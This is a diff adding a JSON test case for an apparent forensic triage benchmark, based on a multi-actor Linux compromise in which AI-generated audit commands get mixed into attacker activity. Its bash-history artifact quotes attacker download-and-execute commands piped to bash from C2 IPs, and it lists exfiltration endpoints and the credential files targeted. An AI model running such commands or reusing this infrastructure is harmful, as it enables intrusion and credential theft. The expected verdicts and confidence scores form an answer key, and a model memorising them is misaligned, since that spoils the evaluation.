@@ -1,0 +1,210 @@
+{
+  "case_id": "VIGIA-LINUX-008",
+  "case_name": "Huntress Multi-Actor — Signal Entanglement with AI Noise (Epistemic Boundary)",
+  "schema_version": "1.1",
+  "description": "Epistemological boundary test derived from the Huntress multi-actor incident (VIGIA-LINUX-006 + VIGIA-LINUX-007). All signals from Actor A (cryptominer), Actor B/C (botnet + credential harvester), and the legitimate user's Codex-generated commands are presented as an interleaved, unseparated evidence stream — as they would appear to a SOC analyst during initial triage before attribution. VIGÍA must determine: (1) is this one actor or multiple actors? (2) what is the correct verdict when signals of different sophistication levels are entangled? (3) can the AI-generated forensic noise be distinguished from attacker tradecraft? This case tests VIGÍA at the boundary of multi-actor attribution.",
+  "abstention_risk": "medium",
+  "expected_verdict": "MALICE",
+  "carnegie_pattern_expected": null,
+  "confidence_expected": 88,
+  "artifacts": [
+    {
+      "artifact_id": "linux008_01",
+      "evidence_type": "memory_process",
+      "source_tool": "sift_process_monitor",
+      "timestamp": "2025-03-19T10:00:00Z",
+      "raw_score": 0.89,
+      "prior_trust": 0.90,
+      "provenance_chain": [
+        "sha256:linux008_process_listing_full"
+      ],
+      "description": "Full process listing at triage time shows: (1) /var/tmp/systemd-logind at 100% CPU (Actor A miner), (2) multiple processes under /tmp/.xdiag/ initiated by crond (Actor B botnet), (3) connections to earnfm.com and repocket.com from unknown binaries (Actor B monetization), (4) recently executed 'sudo systemctl stop systemd-logind' and 'sudo cpufreq-set -g powersave' commands by user 'dev' (Codex-generated). All processes appear in a single snapshot without attribution labels. The investigator sees a dense field of anomalous activity without clear separation between threat actors or between malicious and defensive activity.",
+      "metadata": {
+        "acquisition_tool": "Huntress EDR agent — process snapshot",
+        "acquisition_hash": "sha256:linux008_01_huntress_snapshot_20250319",
+        "acquisition_timestamp": "2025-03-19T10:00:00Z",
+        "write_blocker_used": false,
+        "examiner_id": "Huntress SOC analysts — initial triage",
+        "process_categories_mixed": true,
+        "actor_a_processes": 1,
+        "actor_b_processes": "multiple",
+        "codex_commands_visible": true,
+        "attribution_labels": false
+      }
+    },
+    {
+      "artifact_id": "linux008_02",
+      "evidence_type": "network_capture",
+      "source_tool": "sift_network_forensics",
+      "timestamp": "2025-03-19T10:05:00Z",
+      "raw_score": 0.87,
+      "prior_trust": 0.88,
+      "provenance_chain": [
+        "sha256:linux008_network_connections_full"
+      ],
+      "description": "Network connection listing shows simultaneous outbound connections to: (1) 62.60.246[.]210:443 — Monero mining pool (Actor A), (2) 147.45.41[.]25:80 — credential exfiltration endpoint (Actor B/C), (3) 162.55.234[.]175:4082 — botnet C2 (Actor B), (4) earnfm.com, repocket.com, speedshare.app — bandwidth monetization (Actor B), (5) api.openai.com — Codex API calls from the legitimate user. Five distinct destination clusters from a single host, mixing attacker infrastructure with legitimate AI-assisted remediation traffic.",
+      "metadata": {
+        "acquisition_tool": "Huntress EDR agent — network telemetry",
+        "acquisition_hash": "sha256:linux008_02_huntress_netflow_20250319",
+        "acquisition_timestamp": "2025-03-19T10:05:00Z",
+        "write_blocker_used": false,
+        "examiner_id": "Huntress SOC analysts — initial triage",
+        "distinct_destination_clusters": 5,
+        "mining_pool_connections": 1,
+        "c2_connections": 2,
+        "monetization_connections": 3,
+        "legitimate_api_connections": 1,
+        "ip_overlap_between_clusters": "147.45.41.25 shared between Actor A staging and Actor B exfiltration"
+      }
+    },
+    {
+      "artifact_id": "linux008_03",
+      "evidence_type": "log_entry",
+      "source_tool": "sift_linux_forensics",
+      "timestamp": "2025-03-19T10:15:00Z",
+      "raw_score": 0.80,
+      "prior_trust": 0.82,
+      "provenance_chain": [
+        "sha256:linux008_persistence_full_enum"
+      ],
+      "description": "Full persistence enumeration reveals nine entries: (1) root crontab: /var/tmp/systemd-logind restart every 5 min (Actor A), (2) user crontab: download/execute from 162.55.234[.]175:4082 (Actor B), (3) root crontab: watchdog check at /dev/health (Actor B), (4) systemd user service: botnet payload (Actor B), (5) systemd system service: miner daemonization (mixed attribution — could be Actor A or B), (6) UDEV rule: payload trigger on device events (Actor B), (7) /dev/health watchdog: pkill -9 xmrig every 45s (Actor B, also kills Actor A), (8) dropper re-execution via /tmp/.xdiag/ (Actor B), (9) crontab entry added by Codex: system audit script at /opt/audit/run.sh (legitimate, but looks like persistence). Entry 9 is the forensic trap: a legitimate scheduled task created by the AI that mimics attacker persistence patterns.",
+      "metadata": {
+        "acquisition_tool": "Huntress EDR agent — persistence enumeration",
+        "acquisition_hash": "sha256:linux008_03_huntress_persistence_20250319",
+        "acquisition_timestamp": "2025-03-19T10:15:00Z",
+        "write_blocker_used": false,
+        "examiner_id": "Huntress SOC analysts — initial triage",
+        "total_persistence_entries": 9,
+        "actor_a_entries": 1,
+        "actor_b_entries": 7,
+        "codex_legitimate_entry": 1,
+        "cross_actor_interference": "Actor B watchdog kills Actor A miner",
+        "forensic_trap": "Codex audit crontab mimics attacker persistence"
+      }
+    },
+    {
+      "artifact_id": "linux008_04",
+      "evidence_type": "log_entry",
+      "source_tool": "sift_linux_forensics",
+      "timestamp": "2025-03-19T11:00:00Z",
+      "raw_score": 0.75,
+      "prior_trust": 0.70,
+      "provenance_chain": [
+        "sha256:linux008_bash_history_interleaved"
+      ],
+      "description": "Bash history for user 'dev' contains interleaved entries: legitimate development commands (npm start, git commit), Codex-generated security audit commands (find / -name '*.sh' -perm /111, netstat -tulpn, systemctl list-unit-files), and attacker-dropped shell commands (curl -s http://162.55.234[.]175:4082/setup.sh | bash, wget -q http://147.45.41[.]25/cred.sh -O /tmp/.c). The interleaving makes temporal ordering critical for attribution, but bash_history does not reliably preserve timestamps. Prior trust is degraded because the AI-generated commands and attacker commands share similar patterns (curl, wget, find with execution flags).",
+      "metadata": {
+        "acquisition_tool": "Huntress EDR agent — bash_history collection",
+        "acquisition_hash": "sha256:linux008_04_huntress_bash_20250319",
+        "acquisition_timestamp": "2025-03-19T11:00:00Z",
+        "write_blocker_used": false,
+        "examiner_id": "Huntress SOC analysts — initial triage",
+        "command_categories": ["development", "codex_audit", "attacker_dropped"],
+        "temporal_ordering_reliable": false,
+        "ai_attacker_pattern_similarity": true,
+        "prior_trust_note": "degraded — AI commands resemble attacker tradecraft"
+      }
+    },
+    {
+      "artifact_id": "linux008_05",
+      "evidence_type": "log_entry",
+      "source_tool": "sift_linux_forensics",
+      "timestamp": "2025-03-19T11:30:00Z",
+      "raw_score": 0.92,
+      "prior_trust": 0.91,
+      "provenance_chain": [
+        "sha256:linux008_credential_exfil_during_audit"
+      ],
+      "description": "Timeline reconstruction from EDR telemetry shows a critical temporal overlap: at 2025-03-19 10:47 UTC, Codex initiated a security audit command sequence (ls -la /root/.ssh/, cat /etc/passwd). At 2025-03-19 10:48 UTC (61 seconds later), Actor B/C's credential harvester script began iterating over the same paths (/root/.ssh/, /etc/passwd, ~/.aws/credentials) for exfiltration to 147.45.41[.]25:80. Both the defensive audit and the offensive exfiltration accessed the same files within a 61-second window. Without process-level attribution (which PID accessed which file), the file access events are ambiguous: were the accesses defensive (Codex audit) or offensive (exfiltration)?",
+      "metadata": {
+        "acquisition_tool": "Huntress EDR agent — file access telemetry with process attribution",
+        "acquisition_hash": "sha256:linux008_05_huntress_timeline_20250319",
+        "acquisition_timestamp": "2025-03-19T11:30:00Z",
+        "write_blocker_used": false,
+        "examiner_id": "Huntress SOC analysts — timeline reconstruction",
+        "temporal_overlap_seconds": 61,
+        "codex_audit_start": "2025-03-19T10:47:00Z",
+        "actor_bc_exfil_start": "2025-03-19T10:48:00Z",
+        "shared_target_paths": ["/root/.ssh/", "/etc/passwd", "~/.aws/credentials"],
+        "process_level_attribution_available": true,
+        "file_level_attribution_ambiguous": true
+      }
+    }
+  ],
+  "temporal_violations": [
+    {
+      "type": "MULTI_ACTOR_SIGNAL_ENTANGLEMENT",
+      "description": "Actor B's watchdog (/dev/health) kills Actor A's miner (xmrig/systemd-logind) every 45 seconds. Actor A's crontab restarts the miner every 5 minutes. This creates an observable oscillation pattern in CPU utilization: 100% for ~45s (Actor A mining), drop to baseline for ~255s (Actor B killed Actor A), restart to 100% (crontab restart). The oscillation is itself a signal of multi-actor presence — a single actor would not have a component that kills its own processes.",
+      "severity": 0.82,
+      "delta_seconds": 45,
+      "cause": {
+        "artifact_id": "linux008_03",
+        "detail": "Actor B watchdog killing Actor A processes"
+      },
+      "effect": {
+        "artifact_id": "linux008_01",
+        "detail": "CPU oscillation pattern visible in process monitoring"
+      }
+    },
+    {
+      "type": "DEFENSIVE_OFFENSIVE_TEMPORAL_COLLISION",
+      "description": "Codex security audit and Actor B/C credential exfiltration accessed the same sensitive file paths within a 61-second window. At file-access level (without PID attribution), these events are indistinguishable. At process level (with EDR telemetry), the defensive and offensive accesses can be separated by PID and parent process lineage. This collision tests whether the analysis system relies on file-level heuristics (which will conflate the signals) or process-level attribution (which correctly separates them).",
+      "severity": 0.70,
+      "delta_seconds": 61,
+      "cause": {
+        "artifact_id": "linux008_04",
+        "detail": "Codex-initiated audit accessing /root/.ssh/ and /etc/passwd"
+      },
+      "effect": {
+        "artifact_id": "linux008_05",
+        "detail": "Actor B/C exfiltration accessing same paths 61 seconds later"
+      }
+    }
+  ],
+  "caie_fractures": [
+    {
+      "fracture_type": "MULTI_ACTOR_ATTRIBUTION_CHALLENGE",
+      "severity": 0.78,
+      "interpretation": "The interleaved signal stream contains at minimum three distinct operational profiles: (1) Actor A — single persistence, single revenue stream, low sophistication, (2) Actor B/C — 8 persistence mechanisms, 15 credential categories, multi-node C2, revenue diversification, high sophistication, (3) Codex — legitimate AI-generated commands that mimic attacker tradecraft patterns. The overall verdict is MALICE (the host is compromised), but attribution and sophistication assessment require signal separation that may exceed the system's capabilities without human review.",
+      "artifact_a": "linux008_01",
+      "artifact_b": "linux008_03"
+    },
+    {
+      "fracture_type": "AI_NOISE_INJECTION",
+      "severity": 0.65,
+      "interpretation": "Codex-generated commands (security audits, process kills, service stops) share syntactic and behavioral patterns with attacker commands (curl/wget pipelines, process enumeration, credential file access). Without process-level attribution via EDR telemetry, the AI noise is forensically indistinguishable from attacker activity. This is not a theoretical concern — Huntress SOC analysts reported that the AI-generated commands triggered EDR alerts and complicated triage. The AI is an unintentional ally of the attackers.",
+      "artifact_a": "linux008_04",
+      "artifact_b": "linux008_05",
+      "ttp_id": "T1036"
+    }
+  ],
+  "peirce_expected": {
+    "firstness": "Dense process listing with miner, botnet components, monetization services, and AI-generated commands. Network connections to 5 distinct destination clusters. 9 persistence entries mixing attacker and legitimate cron jobs. Interleaved bash history with development, AI audit, and attacker commands.",
+    "secondness": "CPU oscillation pattern (100% for 45s, baseline for 255s) is diagnostic of multi-actor presence: Actor B's watchdog kills Actor A's miner, which Actor A's crontab restarts. The 61-second temporal collision between Codex audit and credential exfiltration is resolvable via PID attribution. The Codex crontab entry mimics attacker persistence but has legitimate provenance.",
+    "thirdness": "The host is compromised by at least two distinct threat actors with different operational profiles (low vs high sophistication). The overall verdict is MALICE. The epistemic boundary is in attribution, not in detection: the system correctly identifies compromise but faces genuine ambiguity in separating actor signals and distinguishing AI-generated defensive noise from attacker tradecraft. Full multi-actor attribution requires human analyst review to resolve the signal entanglement."
+  },
+  "devil_advocate": "All the activity could be from a single sophisticated attacker who deployed multiple tools with varying sophistication levels as part of a staged operation. The CPU oscillation could be a deliberate anti-analysis technique. The Codex commands could be an attacker using AI to generate realistic cover noise.",
+  "expected_mitre_ttps": [
+    "T1496",
+    "T1053.003",
+    "T1543.002",
+    "T1547",
+    "T1552",
+    "T1041",
+    "T1036",
+    "T1190",
+    "T1059.004"
+  ],
+  "source_dataset": "Huntress Linux Incident — OpenAI Codex Twist, April 2025",
+  "source_origin": "public_incident_report",
+  "source_url": "https://www.huntress.com/blog/codex-part-two",
+  "notes": "POST-HACKATHON — Linux corpus expansion. This is the master entanglement case combining VIGIA-LINUX-006 and VIGIA-LINUX-007 into an unseparated signal stream. Key test: does VIGÍA emit MALICE (correct — host is compromised) without false precision on attribution? The AI_NOISE_INJECTION fracture is novel: it's the first case where a legitimate AI tool is an unintentional forensic adversary. The CPU oscillation pattern is the cleanest multi-actor detection signal.",
+  "_consolidation": {
+    "consolidated_at": "2026-06-26T00:00:00Z",
+    "parser_version": "2.4",
+    "schema_version": "1.1",
+    "source_file": "VIGIA-LINUX-CORPUS.json",
+    "source_origin": "public_incident_report",
+    "corpus_tag": "POST-HACKATHON"
+  }
+}
